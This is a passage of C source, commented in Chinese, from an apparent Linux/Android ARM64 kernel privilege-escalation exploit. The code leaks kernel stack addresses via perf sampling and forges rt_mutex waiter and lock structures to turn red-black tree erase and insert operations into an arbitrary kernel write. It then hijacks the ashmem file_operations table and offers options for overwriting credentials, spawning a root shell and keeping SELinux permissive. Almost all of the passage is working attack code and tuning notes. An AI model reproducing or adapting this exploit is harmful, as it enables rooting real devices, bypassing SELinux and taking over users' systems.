    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.sample_period = 200;
    pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
    pe.sample_regs_intr = (1ULL << PERF_REG_ARM64_X29) |
                          (1ULL << PERF_REG_ARM64_SP)  |
                          (1ULL << PERF_REG_ARM64_PC);
    pe.disabled = 1;
    pe.exclude_user = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv = 1;
    pe.wakeup_events = 1;

    int fd = (int)syscall(__NR_perf_event_open, &pe, tid, -1, -1, 0UL);
    if (fd < 0) { fprintf(stderr, "[!] perf_event_open(tid=%d) errno=%d\n", tid, errno); return -1; }

    size_t pg = (size_t)sysconf(_SC_PAGESIZE), ms = pg * 9;
    void *map = mmap(NULL, ms, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { close(fd); return -1; }
    struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)map;
    uint8_t *data = (uint8_t *)map + pg;
    size_t dsz = ms - pg;

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(300000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    uint64_t head = meta->data_head;
    __sync_synchronize();
    uint64_t tail = meta->data_tail;
    int n = 0, nk = 0;
    uint64_t cand2 = 0;                     /* 对齐法最小top-sp 那个样本) 仅作对照打印 */
    uint64_t mind = 0x4000;                 /* min(stack_top - sp) */
    uint64_t topsp = 0;
    int shown = 0;
    /* ★第十九轮: 栈顶投票 + 已知函数交叉校验(与【全局选定 T】比对 不是各自的top) */
    struct { uint64_t top; int cnt; } tb[64];
    int ntb = 0;
    struct { uint64_t t; int cnt; } ct[64];   /* 已知函数样本推出的候选T */
    int nct = 0, nfunc = 0;
    while (tail < head && n < 20000) {
        struct perf_event_header *h = (struct perf_event_header *)(data + (tail % dsz));
        if (h->size == 0) break;
        if (h->type == PERF_RECORD_SAMPLE) {
            uint8_t *p = (uint8_t *)h + sizeof(*h);
            uint64_t ip = *(uint64_t *)p; p += 8;
            uint64_t abi = *(uint64_t *)p; p += 8;
            uint64_t x29 = *(uint64_t *)p; p += 8;
            uint64_t sp  = *(uint64_t *)p; p += 8;
            uint64_t pc  = *(uint64_t *)p; p += 8;
            n++;
            (void)ip; (void)abi; (void)x29;
            if (sp >= 0xffffff8000000000ULL) {
                uint64_t top = (sp + 0x3FFFULL) & ~0x3FFFULL;
                /* ★伪样本硬过滤: 栈顶绝不可能落在内核镜像头部那一段                 *   (实测伪样本家时top=0xffffff800800c000 < KIMAGE_TEXT_BASE) */
                if (top > KIMAGE_TEXT_BASE) {
                nk++;
                uint64_t d = top - sp;
                if (d < mind) { mind = d; topsp = top; }
                uint64_t off = pc - (KIMAGE_TEXT_BASE + g_slide);
                if (shown < 8) {
                    fprintf(stderr, "[*]   sample pc_off=0x%llx sp=0x%llx top-sp=0x%llx\n",
                            (unsigned long long)off, (unsigned long long)sp,
                            (unsigned long long)d);
                    shown++;
                }
                {   /* 栈顶投票: 同一线程的内核样本必落在同一个16KB 块*/
                    int i, f = 0;
                    for (i = 0; i < ntb; i++) if (tb[i].top == top) { tb[i].cnt++; f = 1; break; }
                    if (!f && ntb < 64) { tb[ntb].top = top; tb[ntb].cnt = 1; ntb++; }
                }
                /* --- 已知函数样本给出的候选T (留到最后与全局 topmode 比对) --- */
                {
                    uint64_t candT = 0;
                    if (off >= OFF_EL0_SVC && off < OFF_EL0_SVC + LEN_EL0_SVC)
                        candT = sp;                                   /* el0_svc_naked: sp == T */
                    else if (off >= OFF_COMPAT_SYS_ADJTIMEX &&
                             off < OFF_COMPAT_SYS_ADJTIMEX + LEN_COMPAT_SYS_ADJTIMEX)
                        candT = sp + FRAME_COMPAT_ADJTIMEX;
                    else if (off >= OFF_COMPAT_GET_TIMEX &&
                             off < OFF_COMPAT_GET_TIMEX + LEN_COMPAT_GET_TIMEX)
                        candT = sp + FRAME_COMPAT_GET_TIMEX;
                    if (candT) {
                        int i, f = 0;
                        nfunc++;
                        for (i = 0; i < nct; i++) if (ct[i].t == candT) { ct[i].cnt++; f = 1; break; }
                        if (!f && nct < 64) { ct[nct].t = candT; ct[nct].cnt = 1; nct++; }
                    }
                }
                }
            }
        }
        tail += h->size;
    }
    meta->data_tail = head;
    munmap(map, ms);
    close(fd);
    /* 兜底: 栈是 16KB 对齐块 T = stack_top - ENTRY_DELTA */
    if (topsp) cand2 = topsp - ENTRY_DELTA;
    /* ★第十九轮: 唯一返回值= 栈顶多数票- ENTRY_DELTA */
    {
        uint64_t topmode = 0;
        int cmod = 0, i, cfn = 0;
        for (i = 0; i < ntb; i++) if (tb[i].cnt > cmod) { cmod = tb[i].cnt; topmode = tb[i].top; }
        *out_T = topmode ? (topmode - ENTRY_DELTA) : 0;
        fprintf(stderr, "[*] perf(tid=%d): 样本=%d 内核栈样本%d(已过滤伪样本) 已知函数样本=%d 最小top-sp)=0x%llx\n",
                tid, n, nk, nfunc, (unsigned long long)mind);
        fprintf(stderr, "[*]   栈顶投票: 0x%llx x%d / %d 个不同栈顶(内核样本 %d)\n",
                (unsigned long long)topmode, cmod, ntb, nk);
        fprintf(stderr, "[*]   ★T = 栈顶 - 0x%llx = 0x%llx   (对照 对齐法x%llx)\n",
                (unsigned long long)ENTRY_DELTA, (unsigned long long)*out_T,
                (unsigned long long)cand2);
        fprintf(stderr, "[*]   已知函数样本 %d 不(%d 个不同候选T); 伪样本已按top<=KIMAGE_TEXT_BASE 过滤\n",
                nfunc, nct);
        if (!topmode) { fprintf(stderr, "[!] 无任何内核栈样本 -> 失败\n"); return -1; }
        /* ★多数票必须压倒性(伪样本家族实测可判~55%, 所以阈值取 75%) */
        if (cmod * 4 < nk * 3) {
            fprintf(stderr, "[!] 栈顶多数票%d 不足内核样本 %d 的75%% -> 样本被污染 拒绝返回\n", cmod, nk);
            *out_T = 0; return -1;
        }
        /* ★交叉校验: 已知函数样本推出的候选T 重 有多少与"全局选定的T"一致*/
        for (i = 0; i < nct; i++) if (ct[i].t == *out_T) cfn += ct[i].cnt;
        fprintf(stderr, "[*]   函数交叉校验: 与所选T 一致的样本 %d / %d (已知函数样本)\n", cfn, nfunc);
        if (nfunc > 0 && cfn == 0) {
            fprintf(stderr, "[!] 已知函数样本全部与所选T 矛盾 -> 帧布局假设失效, 拒绝返回\n");
            *out_T = 0; return -1;
        }
        return 0;
    }
}

/* -------------------------- 用perf 采样任意 tid 的内核PC + 调用链*/
/* 目的: 消费者syscall 卡在内核里时, 直接采它在哪个内核地址自旋.
 * sample_type = IP | CALLCHAIN  ->  样本布局 [ip][nr][ip0..ip(nr-1)]
 * ★必须【先挂后卡。 perf_event_open(pid=目标) 需要内核用 task_function_call
 *   让目标线程执行安装回调 线程一旦卡在内核里, 安装就会挂住 -> 什么都拿不到 */
static int      g_tr_fd  = -1;
static void    *g_tr_map = NULL;
static size_t   g_tr_ms  = 0;
static size_t   g_tr_dsz = 0;
static int      g_tr_tid = 0;
static uint64_t g_tr_tail = 0;
static int      g_tr_shown = 0;

static void trace_begin(int tid) {
    if (tid <= 0) { fprintf(stderr, "[!] trace: tid 无效\n"); return; }
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.sample_period = 20000;           /* 20us: 连打模式下要能落进很短的链走窗口 */
    pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;
    pe.sample_max_stack = 24;
    pe.disabled = 1;
    pe.exclude_user = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv = 1;
    pe.wakeup_events = 1;

    int fd = (int)syscall(__NR_perf_event_open, &pe, tid, -1, -1, 0UL);
    if (fd < 0) { fprintf(stderr, "[!] trace perf_event_open(tid=%d) errno=%d\n", tid, errno); return; }
    size_t pg = (size_t)sysconf(_SC_PAGESIZE), ms = pg * 9;
    void *map = mmap(NULL, ms, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { close(fd); return; }
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    /* ★丢弃此刻之前的样本纯用户态操作: 只关必放行消费者之后的采样*/
    {
        struct perf_event_mmap_page *m = (struct perf_event_mmap_page *)map;
        __sync_synchronize();
        g_tr_tail = m->data_head;
        m->data_tail = g_tr_tail;
    }
    g_tr_fd = fd; g_tr_map = map; g_tr_ms = ms; g_tr_dsz = ms - pg; g_tr_tid = tid;
    fprintf(stderr, "[*] trace: 已挂到tid=%d, 采样已开始在放行消费者之前\n", tid);
}

/* ★★ 只读轮询: 绝不能ioctl(DISABLE)/close/munmap ——它们都要让【卡死的目标线程。 *    执行回调(event_function_call/task_function_call), 会把自己挂住. */
static void trace_poll(const char *tag, int max_total) {
    if (g_tr_fd < 0 || !g_tr_map) return;
    struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)g_tr_map;
    uint8_t *data = (uint8_t *)g_tr_map + (g_tr_ms - g_tr_dsz);
    __sync_synchronize();
    uint64_t head = meta->data_head;
    uint64_t base = KIMAGE_TEXT_BASE + g_slide;
    int guard = 0;
    while (g_tr_tail < head && g_tr_shown < max_total && guard++ < 4000) {
        struct perf_event_header *h = (struct perf_event_header *)(data + (g_tr_tail % g_tr_dsz));
        if (h->size == 0) break;
        if (h->type == PERF_RECORD_SAMPLE) {
            uint8_t *p = (uint8_t *)h + sizeof(*h);
            uint64_t ip = *(uint64_t *)p; p += 8;
            uint64_t nr = *(uint64_t *)p; p += 8;
            fprintf(stderr, "[TRACE:%s#%d] ip_off=0x%llx chain(%llu):",
                    tag, g_tr_shown, (unsigned long long)(ip - base), (unsigned long long)nr);
            for (uint64_t k = 0; k < nr && k < 16; k++) {
                uint64_t v = *(uint64_t *)(p + k * 8);
                fprintf(stderr, " 0x%llx", (unsigned long long)(v - base));
            }
            fprintf(stderr, "\n");
            g_tr_shown++;
        }
        g_tr_tail += h->size;
    }
    meta->data_tail = g_tr_tail;
}

/* ------------------------------------------- 任意写缓冲构造需已知 R) */
/* ★★★第十九轮第四次修正——把payload 放到【第一次。rb_erase_cached.
 *
 * 为什么 真机 trace + 反汇编表明链走会先在 +0x308 做 *     rb_erase_cached(&W.tree_entry, &L->waiters)          (= rt_mutex_dequeue)
 * 之后才进入很深的树状态机(那里我们的伪造对象会触发无限下降 -> 关中断死循环).
 * 而这两次 erase 用的是【同一个。__rb_change_child 写原语 所以直接把 payload
 * 放在第一次 就只要链走跑到acdc→ad00 这几条极简检查即可命中 不必深入.
 *
 * 布局 (L = B, 不waiter 重叠但字段互不冲突:
 *   buf 0x00 (u32) = 0            L->wait_lock              (trylock 必须成功)
 *   buf 0x08       = 0            L->waiters.rb_root.rb_node
 *   buf 0x10       = R            L->waiters.rb_leftmost = W (BUG_ON: *(W+0x38)==L ✅
 *   buf 0x18       = parent       W.tree_entry.pc (= L->owner, prerequeue 路径只被 cmp)
 *   buf 0x20       = value        W.tree_entry.rb_right  <- 写进去的 child
 *   buf 0x28       = 0            W.tree_entry.rb_left = 0 => Case 1
 *   buf 0x30       = R+0x18       W.pi_tree_entry.pc = node => RB_EMPTY, 第二次erase 跳过
 *   buf 0x48       = &init_task   W.task
 *   buf 0x50       = L            W.lock
 * 第一次erase 内部 (rb_erase_cached, rb_leftmost==node 分支):
 *   bbc4: pc = node->pc = parent ; != node -> bc64
 *   bc64: child=value != 0 -> bc68..bc74 没value+0x10 找后续value 必须是可读内核地址!)
 *   bcc0: L->waiters.rb_leftmost = value
 *   bce0: *(u64*)(parent+8) = child   <-- ★任意写(parent=target-8 => 落在 target)
 *   bce8: *(u64*)child      = pc      <-- ★★ 所以value 必须是【可写内核地址。 */
static void build_autowrite_buf(uint64_t target, uint64_t value) {
    /* ★★★第二十七轮关键修正 做lock L 从【缓冲偏移0】挪到【偏移0x58】。     *
     * 为什么必须挪: 第二十六轮真机已证明写能落地, 但链走随后的 "owner 追加" 会挂死。     * 反汇编rt_mutex_adjust_prio_chain, out\dis_apc2.txt)证据:
     *     169: ldr x8, [x24, #0x18]     ; owner = L->owner
     *     170: cmp x8, #1
     *     171: b.ls  <退出路径          ; owner 不0/1 时安全退出     *     173: and x19, x8, #~1          ; task = owner
     *     174: add x25, x19, #0x8dc      ; &owner->pi_lock
     *     177-181: ldxr/stxr [x19,#0x68] ; get_task_struct(owner)  →乱加引用计数
     *     182: bl  _raw_spin_lock        ; raw_spin_lock(owner+0x8dc) →★该处非0 => 关中断死循环
     *     183: ldr x8, [x19, #0x900]     ; owner->pi_blocked_on →继续追垃圾     * 旧布局重L 在偏移0 => L->owner(L+0x18 @buf 0x18) 不W.tree_entry.pc 重合 = target-8,
     * 于是 owner 是【任意内核数据。 必然乱写/死循环——这正是台账第十七轮     * "owner 必须是真 task" 的硬约束, 而旧 build_autowrite_buf 违反了它。     *
     * 新布局(L = B+0x58):
     *   L+0x00 wait_lock   @buf 0x58 = 0   (不W.prio 共享字节: W.prio=0 != task->prio ✅
     *   L+0x08 rb_node     @buf 0x60 = 0   (不W.deadline 共享字节, 都是 0 ✅
     *   L+0x10 rb_leftmost @buf 0x68 = P
     *   L+0x18 owner       @buf 0x70 = &init_task     ★★ 真task, owner 追加安全
     * 写原语仍在【第一次erase。 parent = W.tree_entry.pc @buf 0x18 = target-8 ✅     *
     * BUG_ON(rt_mutex_top_waiter(L)->lock == L): 可P = B-0x38, 到P+0x38 = B,
     *   者buf 0x00 被填成L => *(u64*)(P+0x38) = L ✅(buf 0x00 本来是空闲槽) */
    uint64_t R = g_R, B = R - 0x18, parent = target - 8;
    uint64_t L = B + 0x58;
    uint64_t P = B - 0x38;
    memset(g_buf, 0, STRADDLE_FILL);           /* ★只清到STRADDLE_FILL */
    *(uint64_t *)(g_buf + 0x00) = L;                 /* P->lock: 满足 BUG_ON (见函数头注释) */
    *(uint64_t *)(g_buf + 0x08) = 0;
    *(uint64_t *)(g_buf + 0x10) = 0;
    *(uint64_t *)(g_buf + 0x18) = opt_aw_nowrite ? R : parent;  /* W.tree_entry.pc = parent
                                                            * (--aw-nowrite 时=R => RB_EMPTY, 跳过 erase) */
    *(uint64_t *)(g_buf + 0x20) = value;             /* W.tree_entry.rb_right = child */
    *(uint64_t *)(g_buf + 0x28) = 0;                 /* W.tree_entry.rb_left = 0  */
    *(uint64_t *)(g_buf + 0x30) = R + 0x18;          /* W.pi_tree_entry.pc = node => RB_EMPTY */
    *(uint64_t *)(g_buf + 0x38) = 0;
    *(uint64_t *)(g_buf + 0x40) = 0;
    *(uint64_t *)(g_buf + 0x48) = g_init_task;       /* W.task                    */
    *(uint64_t *)(g_buf + 0x50) = L;                 /* W.lock = L                */
    *(uint64_t *)(g_buf + 0x58) = 0;                 /* L->wait_lock = 0  AND  W.prio = 0 */
    *(uint64_t *)(g_buf + 0x60) = 0;                 /* L->rb_node = 0    AND  W.deadline = 0 */
    *(uint64_t *)(g_buf + 0x68) = P;                 /* L->waiters.rb_leftmost = P */
    *(uint64_t *)(g_buf + 0x70) = g_init_task;       /* ★★ L->owner = &init_task(真task) */
    fprintf(stderr, "[*] AW 缓冲: B=0x%llx L=0x%llx R=0x%llx P=0x%llx task=0x%llx  nowrite=%d\n",
            (unsigned long long)B, (unsigned long long)L, (unsigned long long)R,
            (unsigned long long)P, (unsigned long long)g_init_task, opt_aw_nowrite);
    fprintf(stderr, "[*]   L->owner=0x%llx (真task)  L->wait_lock=0x%x  L->rb_leftmost=0x%llx\n",
            (unsigned long long)g_init_task,
            *(uint32_t *)(g_buf + 0x58), (unsigned long long)P);
    fprintf(stderr, "[*] AW 内 *(u64*)(0x%llx) = 0x%llx   (parent=0x%llx, 走第一次erase)\n",
            (unsigned long long)target, (unsigned long long)value,
            (unsigned long long)parent);
}

/* ============================================================================
 * ★★★★★第二十九轮 【enqueue(rb_insert) 写原语】——取代 erase
 *
 * 为什么必须换: 我们用erase 时 rb_erase_cached 会把 L->waiters 清空 =>
 *   rb_leftmost 变成 NULL (或非 waiter) => 链走里那 6 备 *   BUG_ON(rt_mutex_top_waiter(lock)->lock != lock) 必然失败
 *   => brk #0x800 + b . (关中断 => 看门狗重启。这就是我们"写能落地但必挂死"的真因。 *
 * enqueue 路径 (__rt_mutex_enqueue 的rb_link_node 内联):
 *     struct rb_node **link = &lock->waiters.rb_node;      // = L+8
 *     while (*link) { parent = *link; ... link = &parent->rb_left / &parent->rb_right; }
 *     rb_link_node(node, parent, link):  node->pc = parent; node->l = node->r = 0; *link = node;
 *   => 写入恒为 *(u64*)link = node, 者link 由【我们可控的 L->rb_node = X】决定
 *        走右 => link = X+8     走左 => link = X+0x10
 * 者rb_insert_color_cached 会把 rb_leftmost 设成刚插入的节点 => W.lock == L 天然成立
 *   => 那条 BUG 断言【不可能】再失败。 *
 * 参照: gitchw/ghostlock-cve-2026-43499 (ARM32, 端到端拿到root) 用的正是 enqueue;
 *       其假 lock 放在 null_fops+0x24 不owner=0; 本机把假 lock 放在【缓冲偏移0x60。
 *       好处是 ②L->rb_node(0x68) 不W.prio(0x58) 解者 可以自由控制走左/走右;
 *               ②L->owner 落在缓冲偏移 0x78 ——那8 字节超出 copy_from_user 的拷贝范回 *                  (拷贝在0x78 备fault), 由故障路径补零=> owner = 0, 不gitchw 一致。 * ========================================================================== */
static void build_enqueue_buf(uint64_t target) {
    uint64_t R = g_R, B = R - 0x18;
    /* ★★ 做lock 放在【缓冲偏移0x58】——这是本机可行的唯一布局:
     *    L+0x00 wait_lock(u32)   @buf 0x58  == W.prio 的低 32 位=> 必须是0 (否则 raw_spin_lock 自旋)
     *    L+0x08 rb_node          @buf 0x60  == W.deadline       => 存树树X (deadline 只在 prio 相等时才毁
     *    L+0x10 rb_leftmost      @buf 0x68  = 0 (会被 rb_insert 改写)
     *    L+0x18 owner            @buf 0x70  = &init_task  ★★ 真task =>
     *           rt_mutex_is_locked() 为真(链走才会继续), 且追 owner 时init_task->pi_blocked_on==NULL 安全退出。     *    (实测 owner=0 会让本机 4.14 的链走【根本走不到写】而卡死 不gitchw 的5.4 不同)
     *    代价: W.prio 被迫 = 0, 于是走左/走右用X->prio 决定 ——见下面X 的选择。*/
    uint64_t L = B + 0x58;
    /* 方向判定 rt_mutex_waiter_less(W, X) = (0 < X->prio) ——X->prio = *(s32*)(X+0x40)。     * 可X = target-0x10 => link = X+0x10 = target(走【左。, 不     * X+0x40 = target+0x30 = sysctl_max_skb_frags = 17 > 0  => 判定为真 => 必然走左 ✅*/
    uint64_t X = target - 0x10;
    memset(g_buf, 0, STRADDLE_FILL);
    /* ---- W = rt_mutex_waiter @ R = g_buf+0x18 ---- */
    *(uint64_t *)(g_buf + 0x18) = 0;              /* tree_entry.pc  (rb_link_node 会改写为 parent=X) */
    *(uint64_t *)(g_buf + 0x20) = 0;              /* tree_entry.rb_right */
    *(uint64_t *)(g_buf + 0x28) = 0;              /* tree_entry.rb_left */
    *(uint64_t *)(g_buf + 0x30) = R + 0x18;       /* pi_tree_entry.pc = node => RB_EMPTY */
    *(uint64_t *)(g_buf + 0x38) = 0;
    *(uint64_t *)(g_buf + 0x40) = 0;
    *(uint64_t *)(g_buf + 0x48) = g_init_task;    /* W.task = &init_task */
    *(uint64_t *)(g_buf + 0x50) = L;              /* W.lock = L */
    *(uint64_t *)(g_buf + 0x58) = 0;              /* W.prio = 0  并且  L->wait_lock = 0 */
    *(uint64_t *)(g_buf + 0x60) = X;              /* W.deadline = X  并且  L->waiters.rb_node = X */
    *(uint64_t *)(g_buf + 0x68) = 0;              /* L->waiters.rb_leftmost (会被 rb_insert 改写) */
    *(uint64_t *)(g_buf + 0x70) = g_init_task;    /* ★★ L->owner = &init_task (真task) */
    fprintf(stderr, "[*] ENQ 缓冲: B=0x%llx R=0x%llx L=0x%llx X=0x%llx target=0x%llx\n",
            (unsigned long long)B, (unsigned long long)R, (unsigned long long)L,
            (unsigned long long)X, (unsigned long long)target);
    fprintf(stderr, "[*]   L->wait_lock=0x%x  L->rb_node=0x%llx  L->rb_leftmost=0x%llx  L->owner=0x%llx\n",
            *(uint32_t *)(g_buf + 0x58), (unsigned long long)X,
            (unsigned long long)*(uint64_t *)(g_buf + 0x68),
            (unsigned long long)*(uint64_t *)(g_buf + 0x70));
    fprintf(stderr, "[*]   写入路径: rb_link_node -> *(u64*)(X+0x10)=&W  =>  *(u64*)(0x%llx) = 0x%llx\n",
            (unsigned long long)target, (unsigned long long)R);
    fprintf(stderr, "[*]   要求 *(u64*)(X+0x10) 当前一0 (空子树 + X->prio>0 (保证走左)\n");
}

/* -------------------------- 用户态可直接读到的写 oracle (sysctl) */
/* /proc/sys/kernel/perf_event_paranoid 由内核变重sysctl_perf_event_paranoid 直接支持.
 * 我们把它当任意写是否落在的探针 写成功后读回值会变成 (int)(写到那里的值. */
static long read_sysctl_int(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    char b[64];
    long n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) return -2;
    b[n] = 0;
    return strtol(b, NULL, 10);
}
static long show_paranoid(const char *tag) {
    long v = read_sysctl_int("/proc/sys/kernel/perf_event_paranoid");
    fprintf(stderr, "[*] perf_event_paranoid%s = %ld\n", tag, v);
    return v;
}

/* ★★ 第二十九轮 enqueue 写原语的 oracle ——busy_read / busy_poll 是一对相邻的 int,
 *    默认都为 0 (所以那 8 字节一0, 正好满足"落点须先不0"), 且都用户态可读。 *    写入 R 之后: busy_read = (int32)low32(R), busy_poll = (int32)high32(R) ——双重验证。*/
static long show_busy(const char *tag) {
    long a = read_sysctl_int("/proc/sys/net/core/busy_read");
    long b = read_sysctl_int("/proc/sys/net/core/busy_poll");
    fprintf(stderr, "[*] busy_read/busy_poll%s = %ld / %ld\n", tag, a, b);
    return a;
}

/* --------------------------------------------------------------- 探针转储 */static void dump_probe(const char *tag) {
    if (!probe_page) return;
    uint64_t *w = (uint64_t *)(void *)probe_page;
    fprintf(stderr,
        "[*] PROBE%s [0xf8]=0x%llx [0x100]=0x%llx [0x108]=0x%llx [0x110]=0x%llx\n",
        tag,
        (unsigned long long)w[0xf8 / 8], (unsigned long long)w[0x100 / 8],
        (unsigned long long)w[0x108 / 8], (unsigned long long)w[0x110 / 8]);
}

/* ------------------------------------------------------------------- main */
/* ============================================================================
 * 第三十四轮 会fops 表劫持——载波线程 + 伪表 + 任意内核读写
 *
 * ★写原语的正确用法(本机 rb_erase_cached Case-1 路径, off 0x0116bcc8 实测):
 *      0116bce0  str x9,  [x8, #8]   -> *(u64*)(parent+8) = child
 *      0116bce8  str x10, [x9]       -> *(u64*)(child)    = pc
 *   (parent = node->__rb_parent_color & ~3 = pc,  child = node->rb_right)
 *   们 pc = F(伪表地址, 4 字节对齐),  child = TARGET(=&ashmem_misc.fops):
 *      store1: *(u64*)(F+8)  = TARGET   <- 只毁 .llseek 槽pread/pwrite 不走 llseek)
 *      store2: *(u64*)(TARGET) = F      <- ★★ 正是我们要的任意写 *   分支要求: *(u64*)(F+0x10) != node  (F+0x10 = .read 槽= configfs_read_bin_file, 天然满足)
 *   前置: node != L->waiters.rb_leftmost  (L 用W.lock 指定, leftmost 由我们填 P != node)
 *
 * ★伪表放哪: 【常驻阻塞在 pselect(320,&in,&out,&ex) 的载波线程】的内核栈stack_fds。 *   compat_SyS_pselect6 常0xa0, compat_core_sys_select 常0x1c0,
 *   stack_fds = 该函数自身sp + 0x50  =>  F = T - 0xa0 - 0x1c0 + 0x50 = T - 0x210
 *   n=320 => FDS_BYTES(320)=40 => in@F+0x00 / out@F+0x28 / ex@F+0x50, 全0x78 字节,
 *   4.14 的do_select 把结果写进res_in/res_out/res_ex, 【不动输入段。 *   => 阻塞期间这120 字节完全保持我们写入的内定 且地址已知、长期有效。 *
 * ★fd 卫生: do_select 会逐位检查被置位的fd。把所有fd 迁到 >= 320 并关闭<320 的
 *   则任何位都不映射真实 fd => pselect 必然阻塞满超时不会被就绪fd 提前唤醒)。 *   同时 F_DUPFD(...,400) 位fdt->max_fds>=512, 保证 n=min(320,max_fds)=320 不变小。 * ========================================================================== */
static int opt_aw_fops = 0;
static int opt_shell = 0;        /* ★第三十五轮 拿到 root 后exec 交互开root shell */
static const char *opt_cmd = NULL; /* ★第三十五轮 拿到 root 后exec 的root 命令 */
static int opt_no_root = 0;      /* ★第三十五轮 只验证任意读写 不碰 cred */
static int opt_unlock_flag = 0;  /* ★第三十五轮 额外置g_boot_state=1 关掉防护 */
static int opt_write_bootstate = 0; /* ★GR定位: g_boot_state页只读必崩, 默认跳过此写 */
static int opt_no_fops_restore = 0; /* ★第三十五轮 不还原ashmem_misc.fops (仅调试 */
static int opt_set_sid = 0;         /* ★第三十五轮 额外把cred->security sid 置1 (会卡死 仅调试 */
static int opt_permissive = 0;      /* ★第三十五轮 拿到 uid=0 后把 SELinux 保持关闭(全放开) */
static int opt_try_kernel_sid = 0;  /* ★第三十五轮 允许证sid=1 (本机会卡死 仅调试 */
static const char *opt_su_cmd = NULL; /* ★客户立 后root 守护发一条命令*/
static int opt_su_shell = 0;          /* ★客户立 交互开root shell */
/* ★★ 两个"载波区: [0] = F(会file_operations), [1] = G(会struct rt_mutex)
 * 必须分开: 缓冲里的 L 无论收0x00 还是 0x58 都会不W 的字段重发—— *   改0x58 => L->wait_lock 不W.prio 重叠, 而链走正文会写W.prio = owner->prio(非)
 *               => 下一次trylock(L) 永久失败 => 0x813abc8 的trylock 重试环死循环(台账 U2 判据);
 *   改0x00 => L->owner 不W.tree_entry.pc(写入值 重叠 => owner 变成任意内核数据。 * 把L 放到【第二个 pselect 载波的栈】就能同时避开两者。*/
static volatile int carrier_tid[2] = {0, 0};
static volatile int carrier_leak_go = 0;
static volatile int carrier_go_ps[2] = {0, 0};
static volatile int carrier_in_ps[2] = {0, 0};
static volatile int carrier_ps_ret[2] = {-12345, -12345};
static volatile uint64_t g_region[2] = {0, 0};   /* [0]=F, [1]=G */
static uint64_t g_ashmem_fops_slot = 0;
static uint8_t  g_tbl[2][FOPS_TABLE_SIZE] __attribute__((aligned(16)));

static void put64(uint8_t *p, uint64_t v) { memcpy(p, &v, 8); }

static void *carrier_thread(void *arg) {
    int idx = (int)(intptr_t)arg;
    pin_cpu(3 + idx);
    carrier_tid[idx] = (int)syscall(__NR_gettid);
    static uint8_t tx[2][128] __attribute__((aligned(16)));
    memset(tx[idx], 0, sizeof(tx[0]));
    while (!carrier_leak_go) { syscall(__NR_adjtimex, tx[idx]); }
    while (!carrier_go_ps[idx]) usleep(200);
    fd_set in, out, ex;
    FD_ZERO(&in); FD_ZERO(&out); FD_ZERO(&ex);
    memcpy(&in,  g_tbl[idx] + 0x00, FDSET_BYTES_320);
    memcpy(&out, g_tbl[idx] + 0x28, FDSET_BYTES_320);
    memcpy(&ex,  g_tbl[idx] + 0x50, FDSET_BYTES_320);
    struct timespec to;
    to.tv_sec = 300; to.tv_nsec = 0;
    carrier_in_ps[idx] = 1;
    int r = pselect(PSELECT_NFDS, &in, &out, &ex, &to, NULL);
    carrier_ps_ret[idx] = r;
    fprintf(stderr, "[!] carrier[%d]: pselect 提前返回 %d errno=%d (0=超时 => 该区已失效\n",
            idx, r, errno);
    for (;;) pause();                 /* ★绝不退出 保住 vmalloc 内核栈映射*/
    return NULL;
}

/* ★关键(第三十四轮修正: do_select 会先调max_select_fd(), 其中
 *      if (set & ~*open_fds) return -EBADF;
 *   即【任何被置位但已关闭的fd】都会让 pselect 立刻返回 -EBADF!
 *   (起初以为会被静默跳过 ——错。第一次真机就是errno=9 提前返回。
 *   ⇒必须像官方open_selected_fds 那样, 给【每个置位fd】都装上真实 fd,
 *     且该 fd 对相应的事件永不就绪:
 *        in  位-> 管道【写端。永不 POLLIN; 另一端保持打开以免 POLLERR)
 *        out 位-> 管道【读端。永不 POLLOUT)
 *        ex  位-> 管道读端(永不 POLLPRI)
 *   本表实测: in 位在 fd128..255, out 位在 fd256..319, ex 位在 fd0..63/64..127/128..191/256..319
 *   ⇒in∩out = − 故上面的分配无冲突 不fd0/1/2 从未被置位修stderr)。*/
/* ★★ 关键: 两个载波的置位fd 必须【并集】一起武装——单独武装 idx=1 时会把idx=0 需要的 fd 关掉,
 *    导致 idx=0 的pselect 在max_select_fd 处拿到-EBADF 而立刻返回第一次真机就是这个errno=9)。 *    规则: 任一表在 in 位置置位 -> 管道写端(永不 POLLIN); 其余(out/ex 位置) -> 管道读端
 *          (永不 POLLOUT 也永不POLLPRI, 且这了fd 在两表的 in 里都未置位=> 读就绪也无所调。*/
static int fd_arm_pselect_all(void) {
    int pfd[2];
    if (pipe(pfd) != 0) { perror("pipe"); return -1; }
    int we = fcntl(pfd[1], F_DUPFD, 512);
    int re = fcntl(pfd[0], F_DUPFD, 512);
    close(pfd[0]); close(pfd[1]);
    if (we < 0 || re < 0) { fprintf(stderr, "[!] 管道 fd 抬高失败\n"); return -1; }
    int n = 0, nwe = 0, nre = 0;
    for (int f = 3; f < PSELECT_NFDS; f++) {
        int byte = f >> 3, bit = f & 7;
        int need = 0, use_we = 0;
        for (int i = 0; i < 2; i++) {
            int inb  = (g_tbl[i][0x00 + byte] >> bit) & 1;
            int outb = (g_tbl[i][0x28 + byte] >> bit) & 1;
            int exb  = (g_tbl[i][0x50 + byte] >> bit) & 1;
            if (inb || outb || exb) need = 1;
            if (inb) { if (i == 1 && ((g_tbl[0][0x28 + byte] >> bit) & 1)) { /* 无冲突*/ } use_we = 1; }
        }
        if (!need) { close(f); continue; }
        int src = use_we ? we : re;
